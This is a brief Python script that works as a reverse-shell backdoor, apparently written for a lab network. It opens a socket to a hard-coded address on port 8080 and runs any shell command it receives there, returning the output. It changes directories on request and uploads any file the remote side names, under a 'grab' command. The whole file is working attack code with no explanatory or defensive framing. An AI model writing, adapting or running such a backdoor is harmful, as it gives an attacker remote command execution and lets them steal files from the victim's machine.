import socket
import os
import subprocess

def transfer(s, path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            while True:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
            s.sendall(b'DONE')
    else:
        s.sendall(b'Unable to find out the file')

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.126.139', 8080))

    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            s.close()
            break
        elif 'grab' in command:
            grab, path = command.split('*')
            try:
                transfer(s, path)
            except Exception as e:
                s.sendall(str(e).encode())
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:].strip())
                s.sendall((os.getcwd() + "\n").encode())
            except Exception as e:
                s.sendall((str(e) + "\n").encode())
        else:
            try:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = CMD.communicate()
                response = stdout + stderr
                if not response:
                    response = b"Command executed\n"
                s.sendall(response)
            except Exception as e:
                s.sendall((str(e) + "\n").encode())

def main():
    connect()

if __name__ == '__main__':
    main()
